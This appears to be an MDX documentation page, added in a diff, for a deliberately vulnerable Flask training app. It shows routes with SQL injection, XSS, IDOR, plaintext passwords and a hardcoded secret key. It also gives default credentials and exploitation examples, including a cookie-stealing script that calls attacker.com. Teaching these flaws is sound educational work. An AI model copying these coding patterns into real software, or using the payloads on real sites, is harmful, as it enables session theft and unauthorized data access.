@@ -1,0 +1,441 @@
+---
+title: 'Vulnerable Implementation'
+description: 'Complete code reference for the intentionally vulnerable Flask application'
+icon: 'bug'
+---
+
+<Warning>
+  This code contains intentional security vulnerabilities for educational purposes. **Never use this code in production.**
+</Warning>
+
+## Application Structure
+
+The vulnerable application demonstrates common security flaws found in web applications.
+
+### File Organization
+
+```
+vulnerable/
+├── app.py           # Main Flask application with vulnerable routes
+├── database.py      # Database setup with plaintext passwords
+├── templates/       # HTML templates with XSS vulnerabilities
+└── users.db        # SQLite database
+```
+
+## Main Application (app.py)
+
+### Configuration
+
+Source: `vulnerable/app.py:5-6`
+
+```python
+app = Flask(__name__)
+app.secret_key = 'clave_super_secreta_123'
+```
+
+<Warning>
+  **Vulnerability**: Hardcoded secret key in source code
+  - Secret key is visible in version control
+  - Same key used across all deployments
+  - Predictable and easy to compromise
+</Warning>
+
+### Route: Index
+
+Source: `vulnerable/app.py:8-10`
+
+```python
+@app.route('/')
+def index():
+    return render_template('index.html')
+```
+
+Simple homepage with no authentication requirements.
+
+### Route: Login (SQL Injection)
+
+Source: `vulnerable/app.py:12-49`
+
+<Tabs>
+  <Tab title="Full Route">
+    ```python
+    @app.route('/login', methods=['GET', 'POST'])
+    def login():
+        if request.method == 'POST':
+            username = request.form['username']
+            password = request.form['password']
+            
+            connection = create_connection()
+            if not connection:
+                flash('Error de conexión', 'danger')
+                return render_template('login.html')
+                
+            cursor = connection.cursor()
+            
+            # VULNERABLE: SQL Injection
+            query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+            print(f"Query ejecutada: {query}")
+            
+            try:
+                cursor.execute(query)
+                user = cursor.fetchone()
+                
+                if user: 
+                    session['user_id'] = user['id']
+                    session['username'] = user['username']
+                    session['role'] = user['role']
+                    flash('Login exitoso!', 'success')
+                    return redirect('/dashboard')
+                else:
+                    flash('Usuario o contraseña incorrectos', 'danger')
+                    
+            except sqlite3.Error as e:
+                flash(f'Error SQL: {str(e)}', 'danger')
+                print(f"ERROR SQL: {e}")
+            finally:
+                cursor.close()
+                connection.close()
+        
+        return render_template('login.html')
+    ```
+  </Tab>
+  <Tab title="Vulnerable Code">
+    ```python
+    # VULNERABLE: SQL Injection
+    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+    cursor.execute(query)
+    ```
+  </Tab>
+</Tabs>
+
+<Warning>
+  **Critical Vulnerabilities**:
+  
+  1. **SQL Injection** - User input directly concatenated into query
+  2. **No Input Validation** - No sanitization of username or password
+  3. **Plaintext Password Comparison** - Passwords stored and compared in plaintext
+  4. **Error Disclosure** - SQL errors exposed to users
+  5. **Debug Information** - Queries printed to console
+</Warning>
+
+#### Exploitation Example
+
+```bash
+# Bypass authentication with SQL injection
+Username: admin' OR '1'='1
+Password: anything
+
+# Generated query:
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
+# This always returns true, bypassing authentication
+```
+
+### Route: Register
+
+Source: `vulnerable/app.py:51-73`
+
+```python
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        email = request.form['email']
+        
+        connection = create_connection()
+        cursor = connection.cursor()
+        
+        try:
+            query = "INSERT INTO users (username, password, email) VALUES (%s, %s, %s)"
+            cursor.execute(query, (username, password, email))
+            connection.commit()
+            flash('Usuario registrado exitosamente!', 'success')
+            return redirect('/login')
+        except sqlite3.Error as e:
+            flash(f'Error al registrar: {str(e)}', 'danger')
+        finally:
+            cursor.close()
+            connection.close()
+    
+    return render_template('register.html')
+```
+
+<Warning>
+  **Vulnerabilities**:
+  - **Plaintext Password Storage** - Passwords stored without hashing
+  - **No Input Validation** - No length or format checks
+  - **No Password Strength Requirements** - Weak passwords accepted
+  - **Error Disclosure** - Database errors shown to users
+</Warning>
+
+### Route: Dashboard (XSS)
+
+Source: `vulnerable/app.py:75-87`
+
+```python
+@app.route('/dashboard')
+def dashboard():
+    if 'user_id' not in session:
+        flash('Debes iniciar sesión', 'warning')
+        return redirect('/login')
+    
+    # VULNERABLE: XSS
+    message = request.args.get('message', '')
+    
+    return render_template('dashboard.html', 
+                         username=session.get('username'),
+                         message=message,
+                         role=session.get('role'))
+```
+
+<Warning>
+  **XSS Vulnerability**:
+  - Unescaped user input passed to template
+  - Combined with `{{ message|safe }}` in template, allows script injection
+  - No Content Security Policy headers
+</Warning>
+
+#### Exploitation Example
+
+```bash
+GET /dashboard?message=<script>alert('XSS')</script>
+
+# Or steal cookies:
+GET /dashboard?message=<script>fetch('http://attacker.com?c='+document.cookie)</script>
+```
+
+### Route: Profile (IDOR)
+
+Source: `vulnerable/app.py:89-110`
+
+```python
+@app.route('/profile')
+def profile():
+    if 'user_id' not in session:
+        flash('Debes iniciar sesión', 'warning')
+        return redirect('/login')
+    
+    user_id = request.args.get('id', session['user_id'])
+    
+    connection = create_connection()
+    cursor = connection.cursor() 
+    
+    try:
+        cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+        user = cursor.fetchone()
+    except sqlite3.Error as e:
+        flash(f'Error: {str(e)}', 'danger')
+        user = None
+    finally:
+        cursor.close()
+        connection.close()
+    
+    return render_template('profile.html', user=user)
+```
+
+<Warning>
+  **Multiple Vulnerabilities**:
+  
+  1. **IDOR (Insecure Direct Object Reference)** - Any user can view any profile
+  2. **SQL Injection** - User ID concatenated into query
+  3. **No Authorization** - No permission checks
+  4. **Password Exposure** - Returns all user fields including password
+</Warning>
+
+#### Exploitation Example
+
+```bash
+# View admin profile
+GET /profile?id=1
+
+# View all users via SQL injection
+GET /profile?id=1 UNION SELECT * FROM users
+```
+
+### Route: Logout
+
+Source: `vulnerable/app.py:112-116`
+
+```python
+@app.route('/logout')
+def logout():
+    session.clear()
+    flash('Sesión cerrada', 'success')
+    return redirect('/')
+```
+
+Logout functionality is implemented correctly.
+
+## Database Module (database.py)
+
+### Connection Function
+
+Source: `vulnerable/database.py:7-14`
+
+```python
+def create_connection():
+    try:
+        conn = sqlite3.connect(get_db_path())
+        conn.row_factory = sqlite3.Row
+        return conn
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
+```
+
+Basic SQLite connection without additional security measures.
+
+### Database Setup
+
+Source: `vulnerable/database.py:16-46`
+
+```python
+def setup_database():
+    conn = sqlite3.connect(get_db_path())
+    cursor = conn.cursor()
+    
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT NOT NULL UNIQUE,
+            password TEXT NOT NULL,
+            email TEXT,
+            role TEXT DEFAULT 'user',
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+    
+    try:
+        cursor.execute("""
+            INSERT INTO users (username, password, email, role) 
+            VALUES (?, ?, ?, ?)
+        """, ('admin', 'admin123', 'admin@test.com', 'admin'))
+        
+        cursor.execute("""
+            INSERT INTO users (username, password, email) 
+            VALUES (?, ?, ?)
+        """, ('usuario', 'password123', 'user@test.com'))
+    except sqlite3.IntegrityError:
+        pass
+    
+    conn.commit()
+    conn.close()
+```
+
+<Warning>
+  **Database Security Issues**:
+  - **Plaintext Passwords** - Default users have plaintext passwords
+  - **Weak Default Passwords** - 'admin123' and 'password123'
+  - **No Indexes** - Performance issues at scale
+  - **No Password Column Constraints** - No minimum length requirements
+</Warning>
+
+## Default Credentials
+
+<CardGroup cols={2}>
+  <Card title="Admin Account" icon="user-shield">
+    - Username: `admin`
+    - Password: `admin123`
+    - Role: `admin`
+  </Card>
+  <Card title="Regular User" icon="user">
+    - Username: `usuario`
+    - Password: `password123`
+    - Role: `user`
+  </Card>
+</CardGroup>
+
+## Summary of Vulnerabilities
+
+<AccordionGroup>
+  <Accordion title="SQL Injection" icon="database">
+    **Affected Routes**: `/login`, `/profile`
+    
+    User input concatenated directly into SQL queries using f-strings, allowing attackers to:
+    - Bypass authentication
+    - Extract database contents
+    - Modify or delete data
+    - Execute arbitrary SQL commands
+  </Accordion>
+  
+  <Accordion title="Cross-Site Scripting (XSS)" icon="code">
+    **Affected Routes**: `/dashboard`
+    
+    Unescaped user input rendered in templates with `|safe` filter, allowing attackers to:
+    - Inject malicious JavaScript
+    - Steal session cookies
+    - Perform actions on behalf of users
+    - Deface the application
+  </Accordion>
+  
+  <Accordion title="Insecure Direct Object Reference (IDOR)" icon="lock-open">
+    **Affected Routes**: `/profile`
+    
+    No authorization checks on user ID parameter, allowing:
+    - Viewing other users' profiles
+    - Accessing sensitive information
+    - Privilege escalation
+  </Accordion>
+  
+  <Accordion title="Plaintext Password Storage" icon="key">
+    **Affected**: Database, `/register`, `/login`
+    
+    Passwords stored and compared in plaintext:
+    - Database breach exposes all passwords
+    - No protection against rainbow tables
+    - Violates security best practices
+  </Accordion>
+  
+  <Accordion title="Hardcoded Secrets" icon="eye">
+    **Affected**: `app.secret_key`
+    
+    Secret key hardcoded in source:
+    - Visible in version control
+    - Same across all environments
+    - Compromises session security
+  </Accordion>
+  
+  <Accordion title="Missing Security Headers" icon="shield">
+    **Affected**: All routes
+    
+    No security headers configured:
+    - No CSRF protection
+    - No XSS protection headers
+    - No Content Security Policy
+    - No HTTPS enforcement
+  </Accordion>
+</AccordionGroup>
+
+## Testing the Vulnerabilities
+
+<Steps>
+  <Step title="SQL Injection Test">
+    Try logging in with:
+    - Username: `admin' OR '1'='1`
+    - Password: `anything`
+    
+    You'll be logged in as the first user (admin) without knowing the password.
+  </Step>
+  
+  <Step title="XSS Test">
+    After logging in, visit:
+    ```
+    http://localhost:5000/dashboard?message=<script>alert('XSS')</script>
+    ```
+    
+    An alert box will appear, confirming the XSS vulnerability.
+  </Step>
+  
+  <Step title="IDOR Test">
+    While logged in as a regular user, visit:
+    ```
+    http://localhost:5000/profile?id=1
+    ```
+    
+    You'll see the admin profile, including their password.
+  </Step>
+</Steps>
+
+<Note>
+  These vulnerabilities are intentional for educational purposes. The secure implementation demonstrates how to properly fix each issue.
+</Note>
